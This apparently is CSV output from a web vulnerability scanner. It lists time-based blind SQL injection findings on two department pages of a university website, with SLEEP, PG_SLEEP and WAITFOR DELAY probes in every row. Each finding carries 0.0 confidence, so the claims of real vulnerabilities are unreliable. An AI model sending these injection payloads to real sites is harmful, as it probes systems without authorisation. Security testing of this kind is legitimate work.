Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?query=1%27%3B+SELECT+PG_SLEEP%285%29--#1574017975212-eafa706d-27bf),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?page=SLEEP%285%29%23#1574017975212-eafa706d-27bf),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?cmd=SLEEP%285%29%23#1574017975212-eafa706d-27bf),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?search=SLEEP%285%29%23#1574017975212-eafa706d-27bf),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?file=1+OR+SLEEP%285%29#1574017975212-eafa706d-27bf),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?id=SLEEP%285%29%23#1574017975212-eafa706d-27bf),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?q=SLEEP%285%29%23#1574017975212-eafa706d-27bf),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?cmd=1%27%3B+SELECT+PG_SLEEP%285%29--#1574017975212-eafa706d-27bf),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?file=1%27%3B+SELECT+PG_SLEEP%285%29--#1574017975212-eafa706d-27bf),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?page=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1574017975212-eafa706d-27bf),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?cmd=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1574017975212-eafa706d-27bf),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?query=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1574017975212-eafa706d-27bf),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?query=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1574017975212-eafa706d-27bf),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?search=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1574017975212-eafa706d-27bf),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?search=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1574017975212-eafa706d-27bf),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?q=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1574017975212-eafa706d-27bf),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?id=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1574017975212-eafa706d-27bf),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?file=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1574017975212-eafa706d-27bf),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?page=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1574017975212-eafa706d-27bf),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/engineering/computer-science-engineering/?id=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1574017975212-eafa706d-27bf),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?file=1%27+AND+PG_SLEEP%285%29--#1574016421299-0f63f841-e7fb),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?cmd=1%27+AND+PG_SLEEP%285%29--#1574016421299-0f63f841-e7fb),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?q=1%27+AND+SLEEP%285%29--#1574016421299-0f63f841-e7fb),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?search=1%22+AND+SLEEP%285%29--#1574016421299-0f63f841-e7fb),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?id=1%27+AND+SLEEP%285%29--#1574016421299-0f63f841-e7fb),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?q=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016421299-0f63f841-e7fb),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?page=1%27+AND+PG_SLEEP%285%29--#1574016421299-0f63f841-e7fb),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?id=1%22+AND+SLEEP%285%29--#1574016421299-0f63f841-e7fb),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?search=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016421299-0f63f841-e7fb),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?q=1%22+AND+SLEEP%285%29--#1574016421299-0f63f841-e7fb),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?search=1%27+AND+SLEEP%285%29--#1574016421299-0f63f841-e7fb),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?file=1%27+AND+SLEEP%285%29--#1574016421299-0f63f841-e7fb),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?query=1%27+AND+SLEEP%285%29--#1574016421299-0f63f841-e7fb),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?search=1%27%3B+SELECT+PG_SLEEP%285%29--#1574016421299-0f63f841-e7fb),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?query=1%22+AND+SLEEP%285%29--#1574016421299-0f63f841-e7fb),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?cmd=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016421299-0f63f841-e7fb),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?page=1%22+AND+SLEEP%285%29--#1574016421299-0f63f841-e7fb),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?page=SLEEP%285%29%23#1574016421299-0f63f841-e7fb),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?page=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016421299-0f63f841-e7fb),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?id=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016421299-0f63f841-e7fb),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?search=1+OR+SLEEP%285%29#1574016421299-0f63f841-e7fb),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?file=1%27%3B+SELECT+PG_SLEEP%285%29--#1574016421299-0f63f841-e7fb),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?query=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1574016421299-0f63f841-e7fb),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?file=1%22+AND+SLEEP%285%29--#1574016421299-0f63f841-e7fb),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?query=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016421299-0f63f841-e7fb),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?q=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1574016421299-0f63f841-e7fb),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?cmd=1%22+AND+SLEEP%285%29--#1574016421299-0f63f841-e7fb),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?search=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1574016421299-0f63f841-e7fb),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?id=1%27%3B+SELECT+PG_SLEEP%285%29--#1574016421299-0f63f841-e7fb),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?q=1%27%3B+SELECT+PG_SLEEP%285%29--#1574016421299-0f63f841-e7fb),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?file=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1574016421299-0f63f841-e7fb),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?cmd=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1574016421299-0f63f841-e7fb),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?search=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1574016421299-0f63f841-e7fb),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?id=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1574016421299-0f63f841-e7fb),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?file=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1574016421299-0f63f841-e7fb),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?query=1%27+AND+PG_SLEEP%285%29--#1574016421299-0f63f841-e7fb),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?query=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1574016421299-0f63f841-e7fb),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?q=1%27+AND+PG_SLEEP%285%29--#1574016421299-0f63f841-e7fb),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?q=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1574016421299-0f63f841-e7fb),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?id=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1574016421299-0f63f841-e7fb),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?cmd=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1574016421299-0f63f841-e7fb),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?search=1%27+AND+PG_SLEEP%285%29--#1574016421299-0f63f841-e7fb),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?page=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1574016421299-0f63f841-e7fb),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?id=1%27+AND+PG_SLEEP%285%29--#1574016421299-0f63f841-e7fb),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?cmd=1+OR+SLEEP%285%29#1574016421299-0f63f841-e7fb),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?page=1%27%3B+SELECT+PG_SLEEP%285%29--#1574016421299-0f63f841-e7fb),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?cmd=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016421299-0f63f841-e7fb),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?search=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016421299-0f63f841-e7fb),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?file=1+OR+SLEEP%285%29#1574016421299-0f63f841-e7fb),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?file=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016421299-0f63f841-e7fb),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?id=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016421299-0f63f841-e7fb),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?page=1+OR+SLEEP%285%29#1574016421299-0f63f841-e7fb),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?query=1%27%3B+SELECT+PG_SLEEP%285%29--#1574016421299-0f63f841-e7fb),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?file=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016421299-0f63f841-e7fb),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?page=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016421299-0f63f841-e7fb),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?query=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016421299-0f63f841-e7fb),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?q=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016421299-0f63f841-e7fb),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?cmd=1%27%3B+SELECT+PG_SLEEP%285%29--#1574016421299-0f63f841-e7fb),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?q=1+OR+SLEEP%285%29#1574016421299-0f63f841-e7fb),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?page=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1574016421299-0f63f841-e7fb),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?id=1+OR+SLEEP%285%29#1574016421299-0f63f841-e7fb),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?id=SLEEP%285%29%23#1574016421299-0f63f841-e7fb),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?cmd=SLEEP%285%29%23#1574016421299-0f63f841-e7fb),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?q=SLEEP%285%29%23#1574016421299-0f63f841-e7fb),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?page=1%27+AND+SLEEP%285%29--#1574016421299-0f63f841-e7fb),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?cmd=1%27+AND+SLEEP%285%29--#1574016421299-0f63f841-e7fb),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?file=SLEEP%285%29%23#1574016421299-0f63f841-e7fb),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/?query=1+OR+SLEEP%285%29#1574016421299-0f63f841-e7fb),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
